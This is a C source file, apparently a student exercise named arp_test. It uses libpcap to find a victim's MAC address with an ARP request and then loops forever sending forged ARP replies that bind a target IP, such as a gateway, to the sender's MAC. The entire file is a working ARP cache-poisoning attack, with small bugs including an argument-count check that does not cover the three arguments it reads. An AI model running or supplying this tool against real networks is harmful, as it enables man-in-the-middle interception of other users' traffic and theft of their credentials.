#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <errno.h>
enum { ARGV_CMD, ARGV_INTERFACE };
#define ether_ARP 0x0806 
int main(int argc,const char* argv[]){ 


    int sock;
    struct ifreq ifr;
 
    if (argc < 2){
        fprintf(stderr,"usage: arp_test <interface> <victim_ip> <target_ip>   \n");
        exit(1);
    }
    const char* if_name=argv[1];
    const char* victim_ip_string=argv[2];
    const char* target_ip_string=argv[3];

    //Get MAC Address
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, argv[ARGV_INTERFACE]);
 
    int fd=socket(AF_UNIX, SOCK_DGRAM, 0);
 
    if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0){
        perror("socket ");
        return 1;
    }
 
    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
        perror("ioctl ");
        return 1;
    }
    
    close(sock);

////I copied the above Codes.

    struct ether_header eth_header;
    memset(eth_header.ether_dhost, 0xff, sizeof(eth_header.ether_dhost));
    const unsigned char* source_mac_addr=(unsigned char*)ifr.ifr_hwaddr.sa_data;
    memcpy(eth_header.ether_shost,source_mac_addr,sizeof(eth_header.ether_shost));

    eth_header.ether_type = ntohs(ether_ARP);

    
    size_t if_name_len=strlen(if_name);
    if (if_name_len<sizeof(ifr.ifr_name)) {
        memcpy(ifr.ifr_name,if_name,if_name_len);
        ifr.ifr_name[if_name_len]=0;
    } else {
        fprintf(stderr,"interface name is too long");
        exit(1);
    }
    
    int fp=socket(AF_INET,SOCK_DGRAM,0);
    if (fp==-1) {
        perror(0);
        exit(1);
    }

    // Obtain the source IP address, copy into ARP request
    if (ioctl(fp,SIOCGIFADDR,&ifr)==-1) {
        perror(0);
        close(fp);
        exit(1);
    }

    struct sockaddr_in* source_ip_addr = (struct sockaddr_in*)&ifr.ifr_addr;
    // Convert victim IP address from string, copy into ARP request.
    struct in_addr victim_ip_addr={0};
    if (!inet_aton(victim_ip_string,&victim_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",victim_ip_string);
       exit(1);
    }

    struct ether_arp req_header;
    req_header.arp_hrd = htons(0x0001);
    req_header.arp_pro = htons(0x0800);
    req_header.arp_hln = 0x6;
    req_header.arp_pln = 0x4;
    req_header.arp_op = htons(0x0001);
    memcpy(&req_header.arp_sha, source_mac_addr, sizeof(req_header.arp_sha));
    memcpy(&req_header.arp_spa,&source_ip_addr->sin_addr.s_addr,sizeof(req_header.arp_spa));
    memset(req_header.arp_tha, 0x00, sizeof(req_header.arp_tha));
    memcpy(&req_header.arp_tpa,&victim_ip_addr.s_addr,sizeof(req_header.arp_tpa));

    unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
    memcpy(frame,&eth_header,sizeof(struct ether_header));
    memcpy(frame+sizeof(struct ether_header),&req_header,sizeof(struct ether_arp));

    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    pcap_errbuf[0]='\0';
    pcap_t* handle=pcap_open_live(if_name,BUFSIZ,1,1000,pcap_errbuf);
    if (pcap_errbuf[0]!='\0') {
        fprintf(stderr,"%s\n",pcap_errbuf);
    }
    if (!handle) {
        exit(1);
    }

    if(pcap_sendpacket(handle, frame, sizeof(frame))==-1){
        pcap_perror(handle,0);
        pcap_close(handle);
        exit(1);
    }

    while(1){

    	struct pcap_pkthdr* header;         // The header that pcap gives us
	    const u_char* packet;               // The actual packet
    	int res = pcap_next_ex(handle, &header, &packet);
    	if (res == 0) continue;
    	if (res == -1 || res == -2) break;

    	struct ether_header* rec_eth;
    	rec_eth = (struct ether_header*)(packet);
    	
    	if (rec_eth->ether_type == htons(ether_ARP)){

		    struct ether_arp* rec_arp;
		    rec_arp = (struct ether_arp*)(packet+sizeof(ether_header));
		    if (memcmp(rec_arp->arp_spa, &victim_ip_addr.s_addr, sizeof(rec_arp->arp_spa))==0){
			    printf("%d.%d.%d.%d\n",rec_arp->arp_spa[0],rec_arp->arp_spa[1],rec_arp->arp_spa[2],rec_arp->arp_spa[3]);
				printf("receiving packet is Done!\n");
				memcpy(eth_header.ether_dhost, rec_arp->arp_sha, sizeof(eth_header.ether_dhost));
				memcpy(req_header.arp_tha, rec_arp->arp_sha, sizeof(req_header.arp_tha));

		    	break;
		    }
    	}
	
	}

    req_header.arp_op = htons(0x0002);

	struct in_addr target_ip_addr={0};
	if (!inet_aton(target_ip_string,&target_ip_addr)) {
	    fprintf(stderr,"%s is not a valid IP address",target_ip_string);
	    exit(1);
	}
	memcpy(req_header.arp_spa, &target_ip_addr, sizeof(req_header.arp_spa));
	unsigned char spoof[sizeof(ether_header)+sizeof(ether_arp)];
	memcpy(spoof, &eth_header,sizeof(struct ether_header));
	memcpy(spoof+sizeof(ether_header), &req_header, sizeof(struct ether_arp));

    while(1){
	if(pcap_sendpacket(handle, spoof, sizeof(spoof))==-1){
        pcap_perror(handle,0);
        pcap_close(handle);
        exit(1);
    }
	printf("Sending Packet...\n");
	sleep(1);
    }
    pcap_close(handle);


    return 0;
 }

